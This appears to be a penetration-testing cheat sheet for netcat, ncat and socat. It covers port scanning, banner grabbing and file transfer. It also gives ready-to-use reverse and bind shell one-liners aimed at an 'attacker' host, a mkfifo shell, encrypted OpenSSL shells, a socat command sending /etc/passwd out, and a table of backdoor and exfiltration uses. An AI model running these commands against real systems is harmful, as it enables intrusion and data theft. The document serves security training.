# Netcat - The Network Swiss Army Knife

Versatile network utility for reading from and writing to network connections using TCP or UDP protocols.

## Overview

Netcat (nc) is an essential penetration testing tool that can create arbitrary TCP and UDP connections, listen for inbound connections, perform port scanning, and transfer files. It's often called the "network Swiss Army knife" due to its versatility.

## Basic Usage

| Command | Description | Example |
|---------|-------------|---------|
| `nc host port` | Connect to host on port | `nc 192.168.1.100 80` |
| `nc -l port` | Listen on port | `nc -l 4444` |
| `nc -u host port` | UDP connection | `nc -u 192.168.1.100 53` |
| `nc -z host port` | Port scanning | `nc -z 192.168.1.100 80` |
| `nc -v host port` | Verbose output | `nc -v 192.168.1.100 22` |

## Reverse and Bind Shells

### Creating Shells

| Type | Listener Command | Target Command |
|------|------------------|----------------|
| **Bind Shell** | `nc target 4444` | `nc -l 4444 -e /bin/bash` |
| **Reverse Shell** | `nc -l 4444` | `nc attacker 4444 -e /bin/bash` |
| **Windows Bind** | `nc target 4444` | `nc -l 4444 -e cmd.exe` |
| **Windows Reverse** | `nc -l 4444` | `nc attacker 4444 -e cmd.exe` |

### Advanced Shell Techniques

```bash
# Reverse shell without -e flag
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker 4444 > /tmp/f

# Encrypted shell with OpenSSL
# Listener: openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
# Target: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker:4444 > /tmp/s
```

## File Transfer

| Operation | Sender Command | Receiver Command |
|-----------|----------------|------------------|
| **Send file** | `nc -l 4444 < file.txt` | `nc sender 4444 > file.txt` |
| **Receive file** | `nc -l 4444 > received.txt` | `nc receiver 4444 < file.txt` |
| **Directory transfer** | `tar -czf - /path \| nc -l 4444` | `nc sender 4444 \| tar -xzf -` |

## Port Scanning

| Command | Description | Example |
|---------|-------------|---------|
| `nc -z host port-range` | Scan port range | `nc -z 192.168.1.100 20-25` |
| `nc -zv host port-range` | Verbose port scan | `nc -zv 192.168.1.100 1-1000` |
| `nc -zu host port` | UDP port scan | `nc -zu 192.168.1.100 161` |

## Banner Grabbing

| Service | Command | Purpose |
|---------|---------|---------|
| **HTTP** | `echo "GET / HTTP/1.0\n" \| nc host 80` | Web server info |
| **FTP** | `nc host 21` | FTP banner |
| **SSH** | `nc host 22` | SSH version |
| **SMTP** | `nc host 25` | Mail server info |

## Netcat Variants

### Traditional Netcat

```bash
# Original netcat (limited features)
nc -l -p 4444
```

### Netcat with OpenBSD

```bash
# Modern netcat (more features)
nc -l 4444
```

### Ncat (Nmap's netcat)

| Command | Description | Example |
|---------|-------------|---------|
| `ncat -l 4444 --ssl` | SSL/TLS listener | `ncat -l 4444 --ssl` |
| `ncat --exec /bin/bash -l 4444` | Execute command on connect | `ncat --exec /bin/bash -l 4444` |
| `ncat --broker -l 4444` | Multi-client broker mode | `ncat --broker -l 4444` |

## Socat - Extended Netcat

### Basic Socat Usage

| Command | Description |
|---------|-------------|
| `socat TCP-L:4444 EXEC:/bin/bash` | Bind shell with socat |
| `socat TCP:attacker:4444 EXEC:/bin/bash` | Reverse shell with socat |
| `socat OPENSSL-LISTEN:4444,cert=cert.pem TCP:target:22` | SSL proxy |
| `socat FILE:/etc/passwd TCP:attacker:4444` | Send file via socat |

## Security Considerations

- Netcat connections are unencrypted by default
- Be aware that shells created may lack proper TTY
- Always test in authorized environments only
- Monitor network traffic when using netcat
- Use encrypted alternatives (ncat with SSL, socat with OpenSSL) when possible

## Penetration Testing Use Cases

| Scenario | Application |
|----------|-------------|
| **Post-exploitation** | Establish persistent backdoor |
| **Lateral movement** | Pivot through compromised systems |
| **Data exfiltration** | Transfer sensitive files |
| **Service enumeration** | Banner grabbing and fingerprinting |
| **Payload delivery** | Download additional tools/exploits |

## Additional Resources

- [Netcat Official Documentation](http://netcat.sourceforge.net/)
- [Ncat Reference Guide](https://nmap.org/ncat/)
- [Socat Manual](http://www.dest-unreach.org/socat/doc/socat.html)